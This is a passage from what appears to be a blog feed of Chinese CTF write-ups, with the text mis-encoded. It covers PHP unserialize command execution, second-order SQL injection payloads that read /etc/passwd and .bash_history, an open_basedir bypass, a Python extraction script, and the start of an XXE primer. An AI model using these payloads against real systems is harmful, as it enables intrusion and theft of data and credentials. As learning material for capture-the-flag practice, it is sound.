&#125;&#125;?&gt;</code></pre><p><img src="4.PNG"></p><p>å¯ä»¥è®©func=unserializeï¼Œæ„é€ exp</p><pre><code>    &lt;?phpclass Test&#123;    var $p = &quot;dir&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();echo(serialize($a));?&gt;</code></pre><p>varå…¶å®è·Ÿpublicå·®ä¸å¤š</p><p>ä½†æ˜¯å‘ç°æ‰¾ä¸åˆ°flagï¼Œäºæ˜¯å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯† <a href="https://www.runoob.com/linux/linux-comm-find.html">find</a> </p><p>ç”¨äºæŸ¥æ‰¾æˆ‘ä»¬æ‰¾ä¸åˆ°å¾—flag</p><p>æ„é€ expï¼š</p><pre><code>    &lt;?phpclass Test&#123;    var $p = &quot;find / -name &#39;flag*&#39;&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();echo(serialize($a));?&gt;</code></pre><p><img src="5.PNG"></p><p>è¯»å–flag</p><?php    class Test{        var $p = "/tmp/flagoefiu4r93";        var $func = "readfile";    }    $a=new Test();    echo(serialize($a));    ?><p>#åæ€</p><p>ç¬¬ä¸€ï¼šæ²¡æœ‰æƒ³åˆ°unserializeï¼Œæ€ç»´è¿˜æ˜¯æœ‰ç‚¹å±€é™</p><p>ç¬¬äºŒï¼šè¯»å–index.phpï¼Œè¿™ä¸ªè®°å¾—å‰å‡ æ¬¡æœ‰åšé¢˜é‡åˆ°è¿‡ï¼Œè¿˜æ˜¯ä¸å¤§ä¼šæƒ³èµ·</p><p>ç¬¬ä¸‰ï¼šä¸çŸ¥é“find</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯commit</title>
      <link href="/2021/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AFcommit/"/>
      <url>/2021/04/23/%E7%BD%91%E9%BC%8E%E6%9D%AFcommit/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ‰“å¼€é¢˜ç›®åï¼Œè¿›è¡Œæ‰«æç›®å½•ï¼Œå‘ç°æ˜¯gitæ³„éœ²ï¼Œç”¨GitHackæ¢å¤åï¼Œå¾—åˆ°ä¸€ä¸ªwrite_do.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">   header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">   die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">   break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">   break;</span><br><span class="line">default:</span><br><span class="line">   header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">   header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒçŒœæµ‹ï¼Œç»™çš„write_do.phpæ˜¯ä¸å®Œæ•´çš„ï¼Œå› ä¸ºï¼Œçœ‹switchè¿™é‡Œï¼Œcaseåé¢è·Ÿçš„ç›´æ¥å°±æ˜¯breakï¼Œå…·ä½“è¿™ä¸ªåŠŸèƒ½æ˜¯åšä»€ä¹ˆçš„éƒ½æ²¡æœ‰ç»™å‡º</p><p>ä¸¤æ¡æŒ‡ä»¤</p><blockquote><p>git log â€“reflog</p></blockquote><blockquote><p>git reset â€“hard </p></blockquote><pre><code>&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;        header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;    switch ($_GET[&#39;do&#39;])    &#123;        case &#39;write&#39;:           $category = addslashes($_POST[&#39;category&#39;]);        $title = addslashes($_POST[&#39;title&#39;]);        $content = addslashes($_POST[&#39;content&#39;]);        $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;        $result = mysql_query($sql);        header(&quot;Location: ./index.php&quot;);        break;        case &#39;comment&#39;:           $bo_id = addslashes($_POST[&#39;bo_id&#39;]);          $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;        $result = mysql_query($sql);            $num = mysql_num_rows($result);            if($num&gt;0)&#123;            $category = mysql_fetch_array($result)[&#39;category&#39;];            $content = addslashes($_POST[&#39;content&#39;]);            $sql = &quot;insert into comment            set category = &#39;$category&#39;,            content = &#39;$content&#39;,            bo_id = &#39;$bo_id&#39;&quot;;            $result = mysql_query($sql);            &#125;        header(&quot;Location: ./comment.php?id=$bo_id&quot;);        break;       default:        header(&quot;Location: ./index.php&quot;);    &#125;    &#125;else&#123;header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p><img src="1.PNG"></p><blockquote><p>addslashes,åœ¨å¼•å·å‰é¢åŠ ä¸Šåæ–œæ ï¼Œæœ‰ç‚¹å‘äºŒæ¬¡æ³¨å…¥</p></blockquote><p>åˆ†æä»£ç </p><p>writeï¼š</p><p><img src="2.PNG"></p><p>postä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œä¸‰ä¸ªå‚æ•°éƒ½è¢«addslashesï¼Œç„¶åæ‰§è¡Œsqlè¯­å¥ï¼Œå°†è¿™ä¸‰æ¡æ•°æ®æ’å…¥åˆ°boardè¿™å¼ è¡¨é‡Œé¢</p><p><img src="3.PNG"></p><p>è¿™é‡Œå…¶å®å¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®categoryè¿™é‡Œæ²¡æœ‰è¿›è¡Œaddslashesè¿‡æ»¤ï¼Œæ‰€ä»¥è¿™åº”è¯¥å°±æ˜¯æœ¬é¢˜å‡ºç°çš„æ¼æ´ç‚¹ã€‚</p><p><img src="4.PNG"></p><p>è¿™é‡Œæ˜¯æ‰§è¡Œäº†sqlè¯­å¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŒœæµ‹å¦‚æœ$sqlé‡Œé¢æœ‰sqlæ³¨å…¥çš„è¯­å¥æ˜¯ä¸æ˜¯å°±å¯ä»¥æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåœ¨$sqlå»å¡«å†™è¿™ä¸ªæ³¨å…¥è¯­å¥</p><p>è¿™é‡Œéœ€è¦ä»‹ç»ä¸€ä¸ªç»å¸¸åœ¨c++ä¸Šç”¨çš„ï¼Œå¤šè¡Œæ³¨é‡Š</p><p>è¿™é‡Œé¡ºä¾¿åœ¨ä»‹ç»ä¸€é“é¢˜ç›®ï¼Œctfshow web100</p><p><img src="5.PNG"></p><p>è¿™é‡Œå°±æ˜¯ä½¿ç”¨äº†å¤šè¡Œæ³¨é‡Š</p><p><img src="6.PNG"></p><blockquote><p>æˆ‘ä»¬åœ¨ categoryé‡Œè¾“å…¥1â€™,content=database(),/<em>ç„¶ååœ¨ç•™è¨€å“ªé‡Œè¾“å…¥</em>/#ï¼Œç•™è¨€å°±æ˜¯contentï¼Œå°±ç›¸å½“äº</p></blockquote><p><img src="7.PNG"></p><p>æˆ‘åªèƒ½æ³¨å¦‚å‡ºæ¥ä¸€ä¸ªåº“åæ˜¯ctfï¼Œä½†æ˜¯å…¶ä»–çš„æ²¡æœ‰å›æ˜¾ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æ‰€ä»¥ç°åœ¨å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œuser()</p><p><img src="8.PNG"></p><p>çœ‹åˆ°æƒé™æ˜¯rootï¼Œå¦‚æœflagåœ¨æ•°æ®åº“é‡Œï¼Œæ˜¯ä¸éœ€è¦æœ‰rootæƒé™çš„ï¼Œæ‰€ä»¥è¿™é“é¢˜ç›®çš„flagä¸åœ¨æ•°æ®åº“é‡Œ</p><p>è¿™é‡Œå­¦ä¹ åˆ°äº†ä¸€ä¸ªå‡½æ•°</p><p><a href="https://www.jb51.net/article/158595.htm">load_fileå‚è€ƒåœ°å€</a></p><p>/etc/passwd:ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·å’Œç”¨æˆ·çš„ä¸»è¦ä¿¡æ¯</p><p><a href="https://blog.csdn.net/m0_37605642/article/details/97136282?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">/etc/passwdè¯¦ç»†è§£é‡Š</a></p><p><img src="9.PNG"></p><p><img src="20.PNG"></p><p>ç„¶åæŸ¥çœ‹bash_history,è¿™é‡Œé¢ä¿å­˜äº†ç”¨æˆ·æ‰€ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤æ–¹ä¾¿æŸ¥æ‰¾ï¼Œå°±åœ¨å®¶ç›®å½•ä¸‹é¢</p><p>1â€™,content=(select load_file(â€œ/www/home/.bash_historyâ€)),/*</p><p><img src="10.PNG"></p><p>unzip :ç”¨äºè§£å‹ä»¥zipä¸ºåç¼€çš„æ–‡ä»¶<br>cp:ç”¨äºå¤åˆ¶æ–‡ä»¶å’Œç›®å½• <a href="https://www.runoob.com/linux/linux-comm-cp.html">é‡Œé¢çš„ä¸€äº›å‚æ•°</a></p><p>rm-f:å¼ºåˆ¶åˆ é™¤æ–‡ä»¶</p><p>å¾ˆæ˜¾ç„¶ï¼Œæ“ä½œè€…è¿›å…¥åˆ°tmpè¿™ä¸ªç›®å½•é‡Œï¼Œè§£å‹äº†html.zip,å¼ºåˆ¶åˆ é™¤äº†html.zipï¼Œåˆå¤åˆ¶äº†htmlåˆ°/var/wwwï¼Œè¿›å…¥ç›®å½•ï¼Œå¼ºåˆ¶åˆ é™¤ã€‚DS_Store.</p><pre><code>.DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</code></pre><p>ä½†æ˜¯tmp/htmlé‡Œçš„è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰è¢«åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç›®å½•æŸ¥çœ‹ã€‚åˆå› ä¸ºæ–‡ä»¶è¿‡å¤§æ²¡æœ‰åŠæ³•æ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨hexç¼–ç </p><blockquote><p>   1â€™,content=(select hex(load_file(â€˜/tmp/html/.DS_Storeâ€™))),/*</p></blockquote><p><img src="11.PNG"></p><p>è§£ç ï¼Œflagåœ¨flag_8946e1ff1ee3e40f.php</p><blockquote><p>   1â€™,content=(select hex(load_file(â€˜/tmp/html/flag_8946e1ff1ee3e40f.phpâ€™))),/*</p></blockquote><p><img src="12.PNG"></p><p>è§£ç å¾—flag</p><p>è¿™ä¸ªç«Ÿç„¶æ˜¯å‡å¾—.ã€‚ã€‚</p><p>çœŸçš„åœ¨var/www/htmlç›®å½•é‡Œã€‚ã€‚ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŸè°…æ¯web4</title>
      <link href="/2021/04/21/%E5%8E%9F%E8%B0%85%E6%9D%AFweb4/"/>
      <url>/2021/04/21/%E5%8E%9F%E8%B0%85%E6%9D%AFweb4/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>è¿™é“é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†</p><span id="more"></span><h2>æ–°çŸ¥è¯†</h2><h3>å­¦ä¹ å‡ ä¸ªç›®å½•</h3><blockquote><p>/bin</p></blockquote><blockquote><p>ä¸»è¦æ”¾ä¸€äº›ç³»ç»Ÿå¿…å¤‡æ‰§è¡Œæ¡£æ¡ˆï¼Œä¾‹å¦‚ï¼šcatï¼Œcp,gzip,kill,ls,mkdirç­‰ç­‰</p><p><img src="1.PNG"></p></blockquote><blockquote><p>/sbin</p><p>ä¸€èˆ¬æ˜¯è¶…çº§ç”¨æˆ·æŒ‡ä»¤ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹å¼ã€‚</p></blockquote><blockquote><p><img src="2.PNG"></p></blockquote><blockquote><p>/usr/bin</p></blockquote><blockquote><p>ç³»ç»Ÿå®‰è£…çš„å¯æ‰§è¡Œç¨‹åºï¼Œä¼šéšç€ç³»ç»Ÿçš„å‡çº§è€Œæ”¹å˜</p></blockquote><blockquote><p><img src="3.PNG"></p></blockquote><blockquote><p>/usr/local/bin</p></blockquote><blockquote><p>ç»™ç”¨æˆ·æ”¾ç½®è‡ªå·±çš„å¯æ‰§è¡Œç¨‹åºçš„åœ°æ–¹ï¼Œä¸ä¼šè¢«ç³»ç»Ÿå‡çº§è€Œè¦†ç›–åŒåæ–‡ä»¶</p></blockquote><p><img src="19.PNG"></p><blockquote><p>usr/sbin</p></blockquote><blockquote><p>æ”¾ç½®ä¸€äº›ç”¨æˆ·å®‰è£…ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹å¼</p></blockquote><h3>shå‘½ä»¤</h3><p>shå‘½ä»¤æ˜¯shellå‘½ä»¤è¯­è¨€è§£é‡Šå™¨ï¼Œæ‰§è¡Œå‘½ä»¤ä»æ ‡å‡†è¾“å…¥è¯»å–æˆ–ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–ã€‚</p><h3>é‡å®šå‘</h3><p><a href="https://blog.csdn.net/u014360942/article/details/72630322?utm_source=blogxgwz0">å‚è€ƒèµ„æ–™</a></p><h3>linux çš„ 2>&1</h3><blockquote><p>1åœ¨æ–‡ç« é‡Œçš„æ ‡å‡†è¾“å‡ºï¼Œstdout</p></blockquote><blockquote><p>2æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œstderr</p></blockquote><blockquote><p>0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œstdin</p></blockquote><p>æ‰§è¡Œlsä¹‹åï¼Œä¸‹é¢å‡ºç°çš„å°±æ˜¯æ ‡å‡†è¾“å‡º</p><p><img src="8.PNG"></p><p>è¿™æ˜¯æ­£å¸¸æŸ¥è¯¢ï¼Œé‚£å¦‚æœæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å‘¢ï¼Ÿ</p><p><img src="9.PNG"></p><p>æŠ¥é”™äº†ï¼Œå¹¶ä¸”ä¹Ÿè¿”å›äº†é”™è¯¯ä¿¡æ¯ã€‚</p><p>å¦‚æœæˆ‘ä»¬æ‰§è¡Œï¼Œls &gt; 1</p><p><img src="10.PNG"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œè€Œä¸”ç°åœ¨ä¼šå‡ºç°ä¸€ä¸ª 1 çš„æ–‡ä»¶</p><p><img src="11.PNG"></p><p><code>è¿™è¯´æ˜lsçš„æ ‡å‡†è¾“å‡ºè¾“åˆ°äº†1çš„æ–‡ä»¶ä¸­</code></p><p>æŠŠ1æ–‡ä»¶åˆ é™¤ï¼Œç»§ç»­æ‰§è¡Œls hhh &gt; 1</p><p><img src="12.PNG"></p><p>æŠ¥é”™ï¼Œé‡æ–°å»ºäº†1æ–‡ä»¶ï¼Œä½†æ˜¯ 1 é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰</p><p><code>è¿™è¯´æ˜æ ‡å‡†é”™è¯¯è¾“å‡ºæ²¡æœ‰è¾“å…¥åˆ°1é‡Œé¢</code></p><p><img src="13.PNG"></p><p>åˆ é™¤1æ–‡ä»¶ï¼Œç»§ç»­æ‰§è¡Œls hhh &gt; 1 2&gt;&amp;1</p><p><img src="14.PNG"></p><p><img src="15.PNG"></p><p>æˆåŠŸæ‰§è¡Œï¼Œè€Œä¸”é”™è¯¯ä¿¡æ¯ä¹Ÿæ˜¯æˆåŠŸçš„è¢«è¾“å…¥åˆ°1é‡Œé¢å»äº†</p><p>è¿™è¯´æ˜<code>lsçš„æ ‡å‡†é”™è¯¯è¾“å‡ºæˆåŠŸçš„è¢«é‡å®šå‘åˆ°äº†1æ–‡ä»¶å¤¹é‡Œ</code></p><p>è§£é‡Šè¯­å¥</p><blockquote><p>é‡å®šå‘ä½¿ç”¨è§„åˆ™</p></blockquote><p>æ ‡å‡†è¾“å…¥0ã€è¾“å‡º1ã€é”™è¯¯2éœ€è¦åˆ†åˆ«é‡å®šå‘ï¼Œä¸€ä¸ªé‡å®šå‘åªèƒ½æ”¹å˜å®ƒä»¬ä¸­çš„ä¸€ä¸ªã€‚<br>æ ‡å‡†è¾“å…¥0å’Œæ ‡å‡†è¾“å‡º1å¯ä»¥çœç•¥ã€‚ï¼ˆå½“å…¶å‡ºç°é‡å®šå‘ç¬¦å·å·¦ä¾§æ—¶ï¼‰ã€‚<br>æ–‡ä»¶æè¿°ç¬¦åœ¨é‡å®šå‘ç¬¦å·å·¦ä¾§æ—¶ç›´æ¥å†™å³å¯ï¼Œåœ¨å³ä¾§æ—¶å‰é¢åŠ &amp;<br>æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘ç¬¦å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</p><p>é‡å®šå‘ç¬¦ï¼š&gt;</p><p>æ–‡ä»¶æè¿°ç¬¦ï¼š 0ï¼Œ1 ï¼Œ2</p><p>æ·±å…¥äº†è§£ls hhh &gt;1 2&gt;&amp;1</p><p>é¦–å…ˆæ ‡å‡†é”™è¯¯è¾“å‡ºä¼šé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºé‡Œé¢ï¼Œå› ä¸ºæ ‡å‡†è¾“å‡ºå·²ç»è¢«é‡å®šå‘åˆ°1è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æœ€ç»ˆæ ‡å‡†é”™è¯¯è¾“å‡ºä¹Ÿè¢«é‡å®šå‘åˆ°1è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œ</p><h2>è§£é¢˜ æ³•ä¸€</h2><p>è¿›å…¥é¢˜ç›®ï¼Œé¢˜ç›®ä»£ç å¾ˆç®€å•</p><blockquote><?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__); </blockquote><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨lsï¼Œä¼šçœ‹è§</p><p><img src="4.PNG"></p><p>ä½†æ˜¯è¿™ä¸ªzipæ–‡ä»¶ï¼Œæ€ä¹ˆä¹ŸæŠŠä¸å¼€ï¼Œæ‰§è¡Œls /çœ‹è§æœ‰flagï¼Œä½†æ˜¯ä¾ç„¶ä¹Ÿæ˜¯æ‰“ä¸å¼€</p><p><img src="5.PNG"></p><p>å› ä¸ºå¯ä»¥æ‰§è¡Œlsï¼Œæ‰€ä»¥ä¸å¦¨æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹è¯»å– /binæ–‡ä»¶å¤¹</p><p><img src="6.PNG"></p><p>å¯ä»¥çœ‹åˆ°å…¨éƒ¨éƒ½è¢«åˆ é™¤äº†ï¼Œåªå‰©ä¸‹ls rm shï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨shæ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="7.PNG"></p><p>è§£é‡Šå‘½ä»¤è¿™æ ·å†™çš„åŸå› :</p><p><img src="16.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬æ‰§è¡Œ sh 2çš„æ—¶å€™ï¼Œæ˜¯ä¼šå‡ºç°æŠ¥é”™çš„ï¼Œå¹¶ä¸”å¯ä»¥å°†2çš„å†…å®¹è¾“åˆ°æŠ¥é”™é‡Œé¢</p><p><img src="17.PNG"></p><p>ä½†æ˜¯è¿™é“é¢˜ç›®é‡Œæ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å°†é”™è¯¯ä¿¡æ¯é‡å®šå‘è·å¾—flag</p><p>è®°å¾—&amp;ç¼–ç </p><p><img src="18.PNG"></p><h2>è§£é¢˜ æ³•äºŒ</h2><p><img src="20.PNG"></p><p>çœ‹è§é‡Œé¢æœ‰php</p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="21.PNG"></p><blockquote><p>æ–¹æ³•ä¸€ã€php+æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¼šè¢«å½“æˆphpä»£ç æ‰§è¡Œï¼Œç›¸å½“äºæ˜¯include<br>/?xbx=php /flag</p></blockquote><blockquote><p>æ–¹æ³•äºŒã€æŒ‡å®šæ ¹ç›®å½•ï¼Œç»•è¿‡<a href="https://www.jb51.net/article/141767.htm">open_basedir</a>  (å®ƒå¯å°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸ)</p></blockquote><p>/?xbx=php -t / -r â€œinclude(â€˜/flagâ€™);â€</p><blockquote><p>æ–¹æ³•ä¸‰ã€ä½¿ç”¨ç©ºé…ç½®æ–‡ä»¶ï¼ˆé»˜è®¤é…ç½®ï¼‰æ‰§è¡Œphpä»£ç <br>/?xbx=&gt;php.ini<br>/?xbx=php -c php.ini -r â€œinclude(â€˜/flagâ€™);â€</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯2018 Unfinish(äºŒæ¬¡æ³¨å…¥)</title>
      <link href="/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/"/>
      <url>/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æ‰“å¼€é¢˜ç›®ï¼Œç›´æ¥å°±æ˜¯ç™»å½•ç•Œé¢ï¼Œç›´æ¥è·¨å›½æ³¨å†Œç•Œé¢å°±æ˜¯ç‰¹åˆ«ä»¤äººå¥‡æ€ªï¼Œäºæ˜¯ï¼Œæˆ‘å°è¯•äº†register.phpï¼ŒæˆåŠŸè½¬æ¢åˆ°æ³¨å†Œç•Œé¢ï¼Œç„¶åæ³¨å†Œç™»å½•ï¼Œå•¥éƒ½æ²¡æœ‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è¿™åˆ°é¢˜ç›®æ˜¯å…³äºäºŒæ¬¡æ³¨å…¥çš„ï¼Œä»¥å‰æ²¡æœ‰æ¥è§¦è¿‡è¿™ä¸ª</p><p>çœ‹WPï¼Œè¯´æ˜¯è¿™é¢˜æ˜æ˜¾å…·æœ‰äºŒæ¬¡æ³¨å…¥çš„ç‰¹å¾ï¼Œè¾“å…¥é‚®ç®±ï¼Œå¯†ç ï¼Œç”¨æˆ·åï¼Œè¿”å›ç”¨æˆ·å</p><p>çˆ†åº“å</p><blockquote><p>0â€™+hex(database())+â€™0</p></blockquote><p>å‰é¢çš„å•å¼•å·æ˜¯ä¸ºäº†é—­åˆå‰é¢çš„å•å¼•å·ï¼Œåé¢çš„å•å¼•å·æ˜¯ä¸ºäº†é—­åˆåé¢çš„å•å¼•å·</p><p>å¾—åˆ°åº“å web</p><p>ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œå› ä¸ºä¼šå‡ºç°æˆªæ–­é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸¤æ¬¡hexè½¬æ¢</p><blockquote><p>0â€™+hex(hex(database()))+â€™0</p></blockquote><p>ç„¶åæˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“æˆ‘ä»¬å†è¿›è¡Œä¸‹ä¸€æ­¥çš„æ—¶å€™ï¼Œinformationè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å°±ç›²çŒœflagåœ¨flagè¡¨ä¸­</p><p><img src="1.PNG"></p><p>å¦‚è¿™å¼ å›¾ï¼Œä¼šå‡ºç°ç§‘å­¦æŠ€æœ¯æ³•ï¼Œä¼šé€ æˆæˆ‘ä»¬å¾—ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œç„¶åæˆ‘ä»¬ï¼Œå¯ä»¥å€ŸåŠ©substrè¿›è¡Œæˆªæ–­ï¼Œå› ä¸ºè¿›è¡Œfuzzçš„æ—¶å€™å‘ç°é€—å·ä¸èƒ½ç”¨äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å€ŸåŠ©from for</p><pre><code>import requestslogin_url=&#39;url/login.php&#39;register_url=&#39;url/register.php&#39;content=&#39;&#39;for i in range(1,20):    data_register=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;username&#39;:&quot;0&#39;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&#39;0&quot;%i,&#39;password&#39;:&#39;1&#39;&#125;    #print(data)    data_login=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;password&#39;:&#39;1&#39;&#125;    requests.post(register_url,data=data_register)    rr=requests.post(login_url,data=data_login)    rr.encoding=&#39;utf-8&#39;    r=rr.text    location=r.find(&#39;user-name&#39;)    cont=r[location+17:location+42].strip()    content+=cont    print(cont)    #content=content.decode(&#39;hex&#39;).decode(&#39;hex&#39;)print(content)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2021/04/19/XXE/"/>
      <url>/2021/04/19/XXE/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>è½¬è½½ï¼Œ<a href="https://xz.aliyun.com/t/3357">XXEè¯¦è§£</a>ï¼Œ</p><p><a href="https://xz.aliyun.com/t/6887#toc-3">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</a></p><span id="more"></span><h2>XML</h2>è¿™ä¸ªæˆ‘è®°å¾—æ‹›æ–°è€ƒè¯•ä¸­æœ‰è¿™ä¸ªxmlæ³¨å…¥ï¼Œè¯´æ¥æƒ­æ„§è¿™ä¹ˆé•¿æ—¶é—´è¿˜æ˜¯å¯¹è¿™ä¸ªæ²¡æœ‰ä»€ä¹ˆäº†è§£<h3>ä»€ä¹ˆæ˜¯xml</h3><p>xmlæ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰</p><p>XMLçš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®è€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®</p><p>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚</p><p>XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚</p><p>XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚</p><p>XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ã€‚</p><h3>XMLåŸºæœ¬æ ¼å¼ä¸åŸºæœ¬è¯­æ³•</h3><p>åŸºæœ¬æ ¼å¼ï¼š </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xmlæ–‡ä»¶çš„å£°æ˜--&gt;&lt;bookstore&gt;                                                 &lt;!--æ ¹å…ƒç´ --&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--bookçš„å­å…ƒç´ --&gt;&lt;/book&gt;                                                 &lt;!--bookçš„ç»“æŸ--&gt;&lt;/bookstore&gt;                                       